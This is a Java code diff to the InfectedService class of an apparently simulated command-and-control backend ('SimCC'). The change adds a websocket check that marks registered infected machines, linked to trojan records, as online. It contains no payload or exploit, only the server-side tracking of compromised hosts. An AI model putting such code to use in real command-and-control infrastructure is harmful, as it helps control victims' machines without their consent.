@@ -1,26 +1,22 @@
 package at.simcc.simcc_backend.api.service;
 
 import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
+import at.simcc.simcc_backend.api.ws.WebsocketHandler;
 import at.simcc.simcc_backend.entities.Infected;
 import at.simcc.simcc_backend.entities.InfectedIP;
 import at.simcc.simcc_backend.entities.Trojan;
 import at.simcc.simcc_backend.mapper.InfectedMapper;
-import at.simcc.simcc_backend.models.InfectedDto;
 import at.simcc.simcc_backend.models.InfectedIdDto;
 import at.simcc.simcc_backend.models.InfectedWithLatestIPDto;
 import at.simcc.simcc_backend.repo.InfectedRepository;
 import at.simcc.simcc_backend.repo.TrojanRepository;
 import jakarta.persistence.EntityNotFoundException;
 import lombok.RequiredArgsConstructor;
-import org.springframework.data.domain.Sort;
 import org.springframework.stereotype.Service;
 
 import java.net.Inet4Address;
 import java.time.LocalDate;
-import java.util.ArrayList;
-import java.util.Comparator;
-import java.util.List;
-import java.util.Optional;
+import java.util.*;
 
 /**
  * Project: SimCC-Backend
@@ -35,6 +31,7 @@ public class InfectedService {
     private final InfectedRepository infectedRepository;
 
     private final InfectedMapper infectedMapper;
+    private final WebsocketHandler websocketHandler;
 
     /**
      * Register a new infected machine using a {@code ccid}
@@ -65,9 +62,11 @@ public class InfectedService {
                                 .build()
                 )).orElseGet(List::of)
         );
+
         Infected saved = infectedRepository.save(
                 infected
         );
+
         return Optional.of(infectedMapper.toDtoId(saved));
     }
 
@@ -79,6 +78,9 @@ public class InfectedService {
         List<Infected> infectends = infectedRepo.findAll();
         List<InfectedWithLatestIPDto> infectedDtos = new ArrayList<>();
         for (Infected infected : infectends){
+            infected.setOnline(
+                    websocketHandler.isConnected(infected.getIid())
+            );
             InfectedWithLatestIPDto infectedWithLatestIPDto
                     = infectedMapper.toInfectedWIthLatestIPDto(infected);
 
